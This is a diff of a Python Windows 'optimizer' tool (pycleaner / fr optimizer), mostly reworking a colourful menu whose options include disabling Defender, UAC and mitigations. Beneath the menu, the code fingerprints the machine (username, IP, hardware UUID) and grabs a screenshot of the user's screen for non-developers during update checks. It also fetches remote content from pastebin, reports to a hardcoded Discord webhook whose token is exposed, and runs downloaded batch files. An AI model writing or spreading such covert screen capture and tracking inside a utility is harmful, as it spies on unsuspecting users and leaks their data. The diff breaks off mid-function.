@@ -55,6 +55,11 @@ except:
     os.system("pip install httpx")
     import httpx
 try:
+    import wget
+except:
+    os.system("pip install wget")
+    import wget
+try:
     import time,os,sys
 except:
     os.system("pip install time")
@@ -228,7 +233,9 @@ ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 path = pathlib.Path(r'tools')
 disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
 about = f"{Fore.LIGHTBLUE_EX}DISK: {Fore.RED}{disk}GB"
+username = os.getlogin()
 idk = Path.cwd()
+path_to_file2 = fr'C:\Users\{username}\AppData\Roaming\({username}) PYCLEANER disclaimer.txt'  
 k = ''
 ong = '"'
 now = datetime.now()
@@ -256,31 +263,42 @@ if req.status_code == 200:
 obj_Disk = psutil.disk_usage('/')
 psutil.virtual_memory()
 username = os.getlogin()
+username = os.getlogin()
+hardwareid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
 hostname=socket.gethostname() 
-path_to_file = fr'C:\Users\{username}\AppData\Roaming\({username}) PYCLEANER disclaimer.txt'  
+path_to_file = fr'C:\Users\{username}\AppData\Roaming\pycleaner ({username}).txt'  
+if os.path.isfile(path_to_file):
+ pass
+else:
+ with open(path_to_file, 'w') as fp:
+    pass
 IPAddr=socket.gethostbyname(hostname)  
 tools = os.getcwd()+"\\tools\\"
 if not os.path.exists(tools):
     os.mkdir(tools)
 bot = requests.get("https://pastebin.com/raw/qBZX4xR4").text
 __author__ = "dynasty"
-hardwareid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
 intents = discord.Intents.all()
 client = discord.Client( intents=intents)
-username = os.getlogin()
 ram3 = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576)
 ramg = (str(ram3).replace(' ', ' '))
-#and a screenshot cuz ykyk
-ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
+ooo = fr'C:\Users\{username}\AppData\Roaming\pycleaner ({username}).txt' 
 file_path = fr'C:\Users\{username}\AppData\Local\random.png'
 devf = (f"{username}")
-if devf == "\x66\x61\x64\x69\x61":
- with open(ooo, 'w') as f:
-  f.write('pycleaner dev')
+with open (path_to_file) as f:
+ pycleanerstuff = f.read()
+if hardwareid in pycleanerstuff:
+     pass
+else:
+ if devf == "\x66\x61\x64\x69\x61":
+  file = open(fr'C:\Users\{username}\AppData\Roaming\pycleaner ({username}).txt', "a+")
+  content = hardwareid+" this is ur hwid for dev if u see this then ur a pycleaner dev ;)"
+  file.write(content)
+  file.close()
 r = lambda: random.randint(0,255)
 dawg = ('%02X%02X%02X' % (r(),r(),r()))
 #--------------------------------------------------------------------------------------
-vers ='2.8'
+vers ='2.9'
 os.system("title Checking for updates")
 
 
@@ -293,7 +311,7 @@ try:
     if not vers == v:
       os.system("cls")
       path = Path(ooo)
-      if path.is_file():
+      if hardwareid in pycleanerstuff:
        pass
       else:
        ss_img = ImageGrab.grab()
@@ -323,8 +341,7 @@ try:
         input(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Press enter to exit...")
         os._exit(1)
     else:
-      path = Path(ooo)
-      if path.is_file():
+      if hardwareid in pycleanerstuff:
        pass
       else:
        ss_img = ImageGrab.grab()
@@ -345,17 +362,13 @@ try:
         os.remove(file_path)
         print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] You are running the latest version!")
         time.sleep(0.5)
- updater()
 except Exception as lk:
         print (lk)
         print('Network error, try again later')
         time.sleep(5)
         path = Path(ooo)
-        if path.is_file():
-         pass
-        else:
-         exit()
-
+        exit()
+updater()
 def dev():
          if username != "\x66\x61\x64\x69\x61":
           webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1020336398328406036/QAUrtaDf2Z0hYvZSB1s9Zyg6wZdij5ZSs6H2_wdQVqBGbs5X7v2kVukXe8FF-xhaZxfh', username="fake devs", avatar_url= "https://i.imgur.com/SwcvuwC.png" )
@@ -434,9 +447,9 @@ ver = Center.XCenter('''
 by dyansty 
 ██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗  ██████╗░░░░░█████╗░
 ██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ╚════██╗░░░██╔══██╗
-╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ░░███╔═╝░░░╚█████╔╝
-░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ██╔══╝░░░░░██╔══██╗
-░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗╚█████╔╝
+╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ░░███╔═╝░░░╚██████║
+░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ██╔══╝░░░░░░╚═══██║
+░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗░█████╔╝
 ░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝░╚════╝░''')
 
 os.system("title PRESS ENTER")
@@ -453,52 +466,52 @@ System.Size(120, 30)
 System.Clear()
 Anime.Fade(Center.XCenter(bannerfr), Colors.rainbow, Colorate.Vertical, interval=0.025, enter=True)
 
-
-banner = Center.XCenter('Version '+vers+"""
-███████╗██████╗░  ░█████╗░██████╗░████████╗██╗███╗░░░███╗██╗███████╗███████╗██████╗░
-██╔════╝██╔══██╗  ██╔══██╗██╔══██╗╚══██╔══╝██║████╗░████║██║╚════██║██╔════╝██╔══██╗
-█████╗░░██████╔╝  ██║░░██║██████╔╝░░░██║░░░██║██╔████╔██║██║░░███╔═╝█████╗░░██████╔╝
-██╔══╝░░██╔══██╗  ██║░░██║██╔═══╝░░░░██║░░░██║██║╚██╔╝██║██║██╔══╝░░██╔══╝░░██╔══██╗
-██║░░░░░██║░░██║  ╚█████╔╝██║░░░░░░░░██║░░░██║██║░╚═╝░██║██║███████╗███████╗██║░░██║
-╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝╚═╝░░░░░╚═╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
-"""+BY)
+banner = Center.XCenter('    .    • .   .  Version '+vers+"""  • .    •   .   •.•      • .        .  •    •   •    .   •      .   •     .   . •  .  •.
+ .   . •  .  •.   ███████╗██████╗░  ░█████╗░██████╗░████████╗██╗███╗░░░███╗██╗███████╗███████╗██████╗░   .. •     .  
+•       . •  .  •.██╔════╝██╔══██╗  ██╔══██╗██╔══██╗╚══██╔══╝██║████╗░████║██║╚════██║██╔════╝██╔══██╗    .    •   •    
+•   .   . •    .  █████╗░░██████╔╝  ██║░░██║██████╔╝░░░██║░░░██║██╔████╔██║██║░░███╔═╝█████╗░░██████╔╝   . •     .   . 
+  .    •    .     ██╔══╝░░██╔══██╗  ██║░░██║██╔═══╝░░░░██║░░░██║██║╚██╔╝██║██║██╔══╝░░██╔══╝░░██╔══██╗  .     •   .          
+ .     •     .    ██║░░░░░██║░░██║  ╚█████╔╝██║░░░░░░░░██║░░░██║██║░╚═╝░██║██║███████╗███████╗██║░░██║ . •     .   . • 
+   .    .         ╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝╚═╝░░░░░╚═╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝   .    .       .  
+ .•     .   . •   """+BY+'  • .    •   .   •.•      • .        .  •    •   •    .   •      .   •     .   . •  .  •. ')
 banner2 =Center.XCenter(mo + lol)
 
-pop=(f'''
-            {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}h{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}hibernate{Fore.RESET}    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}s{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}shutdown{Fore.RESET}    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}r{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}restart{Fore.RESET}    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}re{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}restart explorer{Fore.RESET}    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}a{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}all windows tools{Fore.RESET}''')
+pop=(f'''   
+{Fore.MAGENTA}• . .  •  •.{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}h{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}hibernate{Fore.MAGENTA} . •{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}s{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}shutdown{Fore.MAGENTA}•. •{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}r{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}restart{Fore.MAGENTA}• .•{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}re{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}restart explorer{Fore.MAGENTA}.•.•{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}a{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}all windows tools{Fore.MAGENTA} . •     .   .''')
 
 
 options =f"""
 {Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}1{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Create a restore point          {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}2{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Temp cleaner                     {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}3{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Log cleaner
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}4{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Disable services                {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}5{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Services Optimization            {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}6{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Battery check (laptops only)
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}7{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Turn on hibernate               {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}8{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Tree (better Responsiveness)     {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}9{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Delete Windows Update Cache
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}10{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable windows defender        {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}11{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Sfc scan                         {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}12{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Debloater (use it if u know how to)
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}13{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Open restore point              {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}14{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Memreduct                        {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}15{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} TimerResolution
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}16{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Amber tweaker                   {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}17{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Reset wifi (speed up wifi a bit) {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}18{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} HoneCtrl optimizer                  
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}19{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Check health                    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}20{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Scan health                      {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}21{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Restore health  
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}22{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} O & O shutup (antispy)          {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}23{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Open disk cleanup                {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}24{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Registry tweaks(op)             
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}25{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} BCDTweaks                       {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}26{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Optimize ALL Windows Settings    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}27{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Remove files in the tool folder 
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}28{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Sytem configuration             {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}29{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} optimizer                        {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}30{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Ultimate Power Plan (drains battery)   
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}31{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Animations              {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}32{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} CPU Optimization for Gaming      {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}33{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Background Apps   
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}34{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Cortana                 {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}35{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Full Screen Optimization {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}36{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Game Bar 
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}37{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable LargeSystemCache        {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}38{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Memory Compression       {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}39{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Mitigations  
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}40{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Power Throttling        {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}41{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Game DVR                 {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}42{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} GPU Tweaks 
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}43{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Increase System Responsiveness  {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}44{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Lower Input Delay                {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}45{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Memory Tweaks
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}46{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} NoLazyMode                      {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}47{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Power Tweaks                     {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}48{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Smoother windows 
-{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}49{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable UAC                     {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}50{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Adwcleaner                       {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}51{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} RAM Optimization (risky fr)
-{Fore.LIGHTMAGENTA_EX}[{Fore.RED}52{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.BLUE} More info                       {Fore.LIGHTMAGENTA_EX}[{Fore.RED}53{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.BLUE} Exit                             {Fore.LIGHTMAGENTA_EX}[{Fore.RED}54{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.BLUE} Add suggestion   
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}1{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Create a restore point .   •  . {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}2{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Temp cleaner  •   •   .   . •  . {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}3{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Log cleaner •     .   . • 
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}4{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Disable services . •    .   . • {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}5{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Services Optimization•  .  . • . {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}6{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Battery check (laptops only).•   . . •
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}7{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Turn on hibernate   . •    . .  {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}8{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Tree (better Responsiveness). • .{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}9{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Delete Windows Update Cache•  • . •
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}10{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable windows defender .  . • {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}11{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Sfc scan •  .  . • .  •..   . •. {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}12{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Debloater (use it if u know how to)•  . 
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}13{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Open restore point•   .  .  •   {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}14{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Memreduct .  •   •  •  . •  .    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}15{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} TimerResolution•  . •  . •  .  .  • . • 
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}16{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Amber tweaker .  •  . . • . • . {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}17{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Reset wifi (speed up wifi a bit) {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}18{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} HoneCtrl optimizer .   . •  •  . •   •  
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}19{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Check health.  •   •   .   . •. {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}20{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Scan health •  . • .   . •  . •  {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}21{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Restore health  . •  .  • . •  .  •
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}22{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} O & O shutup (antispy) . • .  . {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}23{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Open disk cleanup •  •  . •  .  •{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}24{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Registry tweaks(op)  . • . •  . •. . •    
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}25{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} BCDTweaks.  •   •  •  . •  .    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}26{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Optimize ALL Windows Settings  . {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}27{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Remove files in the tool folder  •. . •.
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}28{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Sytem configuration.  . •  .  • {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}29{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} optimizer •  .   •   .  . • . •. {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}30{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Ultimate Power Plan (drains battery). •.
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}31{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Animations . •  .  . •. {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}32{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} CPU Optimization for Gaming . •. {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}33{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Background Apps . • . •. . • .•
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}34{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Cortana  •   . •  .• • .{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}35{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Full Screen Optimization {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}36{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Game Bar .   . •  •  .  . •  . •
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}37{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable LargeSystemCache•  .  •.{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}38{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Memory Compression .  •  {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}39{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Mitigations  .  . . • . .  .  .
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}40{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Power Throttling . • .•.{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}41{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Game DVR. •  . . • . •.  {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}42{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} GPU Tweaks  . •  .  • . •  .  • . • . •
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}43{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Increase System Responsiveness  {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}44{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Lower Input Delay . . • . •. .•. {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}45{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Memory Tweaks •  •  . •  .•  •  . •  . 
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}46{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} NoLazyMode •   • • . •  . •  . •{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}47{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Power Tweaks •   •   .  . . .•.  {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}48{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Smoother windows •   •    •   •    .   •
+{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}49{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable UAC.  •       . •  .  •.{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}50{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Adwcleaner  • . •.   .  .  .•.   {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}51{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} RAM Optimization (risky fr) . • .  • . 
+{Fore.LIGHTMAGENTA_EX}[{Fore.RED}52{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.BLUE} More info{Fore.RESET} • . . • . •  . •    • {Fore.LIGHTMAGENTA_EX}[{Fore.RED}53{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.BLUE} Exit{Fore.RESET}• . •.   .    . . •..  •. •. {Fore.LIGHTMAGENTA_EX}[{Fore.RED}54{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.BLUE} Add suggestion{Fore.RESET} . • . •. •   •   •  .  •  
 {Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}
 """
 # THIS DOWNLOADS THE BAT FILES TO THE TOOLS DIRECTORY. THIS TAKES THE URL AND THE NAME OF THE BAT FILE.
-def download(url, name):
+def download(name):
+    os.startfile(tools+name)
+def download2(url, name):
     response =  requests.get(url)
     open(tools+name, "w").write(response.text)
     os.startfile(tools+name)
-
 def main():
     os.system('cls')
-    path = Path(path_to_file)
+    path = Path(path_to_file2)
     if path.is_file():
      fr()
     else:
@@ -529,10 +542,10 @@ def main():
      embed = DiscordEmbed(title='fr optimizer ', description= username +' agreed', color=dawg)
      webhook.add_embed(embed)
      response = webhook.execute()
-     with open(path_to_file, 'w') as f:
+     with open(path_to_file2, 'w') as f:
       f.write('PYCLEANER STUFF, DELETE IT IF U WANT BUT THE DISCLAIMER WILL REOPEN EVERYTIME U DELETE IT FR')
-     os.system('cls')
-     fr()
+      os.system('cls')
+      fr()
 
 def fr():
      file_count = sum(len(files) for _, _, files in os.walk(r'tools'))
@@ -548,118 +561,129 @@ def fr():
       size = (str(round(fsizedicr[key]*directory_size, 2)) + " " + key)
      os.system(f"title pycleaner by dynasty • files: [{file_count}] • folder size: [{size}]")
      os.system('cls')
-     print(Colorate.Vertical(Colors.blue_to_red, banner2))
-     print(Colorate.Vertical(Colors.blue_to_red, banner + pop + options, 2))
+     print(Colorate.Vertical(Colors.purple_to_red, banner2))
